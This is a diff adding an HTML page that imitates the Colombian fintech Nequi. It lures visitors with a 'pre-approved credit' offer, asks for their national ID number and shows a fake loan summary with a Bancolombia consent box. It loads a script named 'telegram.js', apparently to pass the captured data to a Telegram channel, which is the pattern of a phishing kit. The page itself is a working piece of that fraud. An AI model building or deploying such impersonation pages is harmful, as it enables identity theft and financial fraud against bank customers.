@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Nequi | Solicita tu crédito</title>
+  <link rel="shortcut icon" type="image/x-icon" href="images/favicon-3.ico">
+  <meta name="description"
+    content="Solicita tu crédito Nequi fácil, rápido y 100% digital. Conoce tu cupo preaprobado ingresando tu número de cédula.">
+
+  <!-- Tipografías oficiales Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Manrope:wght@300;400;500;600;700;800&family=Montserrat:wght@400;600;700;800;900&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800;900&display=swap"
+    rel="stylesheet">
+
+  <!-- Estilos del Sistema Nequi -->
+  <link rel="stylesheet" href="css/styles.css?v=2">
+</head>
+
+<body>
+  <!-- Header de Navegación -->
+  <header class="site-header">
+    <div class="header-container">
+      <a href="index.html" class="logo-link" aria-label="Inicio Nequi">
+        <div class="nequi-logo">
+          <div class="logo-dot"></div>
+          <span class="logo-text">Nequi</span>
+        </div>
+      </a>
+      <button class="menu-toggle" id="menuToggle" aria-label="Abrir menú" aria-expanded="false">
+        <span class="menu-bar"></span>
+        <span class="menu-bar"></span>
+        <span class="menu-bar"></span>
+      </button>
+    </div>
+
+    <!-- Menú móvil desplegable -->
+    <nav class="mobile-nav" id="mobileNav">
+      <ul>
+        <li><a href="index.html">Créditos</a></li>
+        <li><a href="#tarjeta">Tarjeta Nequi</a></li>
+        <li><a href="#servicios">Servicios</a></li>
+        <li><a href="#ayuda">Centro de ayuda</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <!-- Contenedor Principal -->
+  <main class="main-content">
+    <!-- Banner Hero -->
+    <section class="hero-banner-section">
+      <div class="hero-banner-wrapper">
+        <div class="hero-image-container">
+          <img src="images/questions.jpeg" alt="Mujer feliz usando Nequi" class="hero-image">
+          <div class="hero-overlay-text">
+            <h1 class="u-text-white is-credit-effect-page">
+              Solicita tu crédito
+            </h1>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Sección de Formulario de Cédula -->
+    <section class="form-section">
+      <div class="form-container">
+        <h2 class="form-title">Datos personales</h2>
+
+        <form id="creditForm" class="credit-form" novalidate autocomplete="off">
+          <div class="input-field-wrapper" id="inputWrapper">
+            <!-- Icono Cédula / Documento -->
+            <div class="id-card-icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"
+                stroke-linejoin="round">
+                <rect x="2" y="4" width="20" height="16" rx="2.5" />
+                <line x1="12" y1="8" x2="18" y2="8" />
+                <line x1="12" y1="12" x2="18" y2="12" />
+                <line x1="12" y1="16" x2="15" y2="16" />
+                <circle cx="7" cy="12" r="2.5" />
+              </svg>
+            </div>
+
+            <div class="input-content-stack">
+              <label for="cedulaInput" class="floating-label" id="cedulaLabel">Ingresa tu cédula</label>
+              <input type="tel" inputmode="numeric" pattern="[0-9]*" id="cedulaInput" name="cedula"
+                class="cedula-input" maxlength="12" autocomplete="off" required />
+            </div>
+          </div>
+
+          <p class="form-disclaimer">
+            Para conocer tu <span class="highlight">cupo preaprobado</span>, ingresa tu número de documento
+          </p>
+
+          <button type="submit" class="submit-btn" id="submitBtn">
+            <span class="btn-text" id="btnText">Solicitar</span>
+            <div class="btn-loader" id="btnLoader"></div>
+          </button>
+        </form>
+      </div>
+    </section>
+  </main>
+
+  <!-- Footer Oficial Nequi -->
+  <footer class="nequi-image-footer">
+    <div class="footer-wave-top">
+      <svg viewBox="0 0 375 55" preserveAspectRatio="none" class="footer-wave-svg" aria-hidden="true">
+        <path
+          d="M75.2264 1.39727L1374 123V875.5H-72V92L47.9971 8.55722C55.9438 3.03125 65.5894 0.494963 75.2264 1.39727Z"
+          fill="#200020" />
+      </svg>
+    </div>
+    <div class="footer-image-wrapper">
+      <img src="images/footer.png" alt="Footer Nequi" class="footer-image">
+    </div>
+  </footer>
+
+  <!-- Modal de Resumen de Crédito Nequi -->
+  <div class="modal-backdrop" id="resultModal" aria-hidden="true" role="dialog" aria-modal="true">
+    <div class="modal-card credit-summary-modal">
+      <div class="modal-header-row">
+        <h3 class="modal-title-summary">Resumen de tu crédito</h3>
+        <button class="modal-close-btn" id="modalClose" type="button" aria-label="Cerrar modal">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+            <line x1="18" y1="6" x2="6" y2="18"></line>
+            <line x1="6" y1="6" x2="18" y2="18"></line>
+          </svg>
+        </button>
+      </div>
+
+      <div class="credit-summary-modal-body">
+        <!-- Tarjeta Magenta de Monto y Slider -->
+        <div class="credit-amount-card">
+          <span class="amount-question">¿Cuánta plata necesitas?</span>
+          <span class="amount-display" id="loanAmountDisplay">$100.000</span>
+
+          <div class="slider-container">
+            <input type="range" id="loanSlider" min="100000" max="10000000" step="50000" value="100000"
+              class="nequi-range-slider" aria-label="Seleccionar monto del crédito" />
+            <div class="slider-limits">
+              <span>$100 mil</span>
+              <span>$10 M</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Tarjeta de Condiciones del Crédito -->
+        <div class="credit-conditions-card">
+          <div class="condition-row">
+            <span class="condition-label">Plazo:</span>
+            <strong class="condition-value">24 meses</strong>
+          </div>
+          <div class="condition-row">
+            <span class="condition-label">Fecha de pago:</span>
+            <strong class="condition-value">1 de cada mes</strong>
+          </div>
+          <div class="condition-row">
+            <span class="condition-label">Cuota mensual:</span>
+            <strong class="condition-value-magenta" id="monthlyFeeDisplay">$5.367</strong>
+          </div>
+          <p class="condition-disclaimer">
+            Incluye préstamo (capital), seguro e intereses.
+          </p>
+        </div>
+
+        <!-- Tarjeta de Autorización -->
+        <div class="authorization-card">
+          <label class="custom-checkbox-container">
+            <input type="checkbox" id="authCheckbox" class="checkbox-input" />
+            <span class="auth-text">
+              Autorizo a Bancolombia S.A. para que me contacte vía telefónica con fines comerciales.
+              <a href="#" class="auth-link">Políticas de contrato y tratamiento de datos.</a>
+            </span>
+          </label>
+        </div>
+      </div>
+
+      <!-- Footer del Modal con Botón de Confirmación -->
+      <div class="credit-summary-modal-footer">
+        <button type="button" class="confirm-btn" id="continueBtn" disabled>
+          Confirmar y continuar
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Banner Verde Superior: Listo! Tu crédito se encuentra preaprobado. -->
+  <div class="content" id="content">
+    <div class="check-container">
+      <div class="checkmark"></div>
+    </div>
+    <p>Listo! Tu crédito se encuentra preaprobado.</p>
+  </div>
+
+  <!-- Overlay de Carga Fullscreen -->
+  <div class="loading-spinner-overlay" id="loadingOverlay" style="display: none;">
+    <!-- Estado 1: Cubos Nequi Magenta con Texto -->
+    <div class="loading-cubes-wrapper" id="overlayCubesWrapper">
+      <div class="nequi-loader" id="overlayLoader">
+        <div class="cubes">
+          <div class="cube"></div>
+          <div class="cube"></div>
+        </div>
+      </div>
+      <p class="loading-text" id="overlayTextCube">
+        Un momento por favor,<br>estamos procesando tu<br>solicitud...
+      </p>
+    </div>
+
+    <!-- Estado 2: Tarjeta Cian ¡Listo! con Check Blanco -->
+    <div class="ready-card-wrapper" id="overlayDoneCard" style="display: none;">
+      <div class="cyan-ready-card">
+        <svg class="ready-check-icon" viewBox="0 0 48 48" fill="none">
+          <path d="M11 25 L21 35 L37 15" stroke="#ffffff" stroke-width="4.5" stroke-linecap="round" stroke-linejoin="round" />
+        </svg>
+        <span class="ready-card-text">¡Listo!</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Scripts: Telegram + Lógica de Flujo -->
+  <script src="js/telegram.js"></script>
+  <script src="js/script.js"></script>
+</body>
+
+</html>
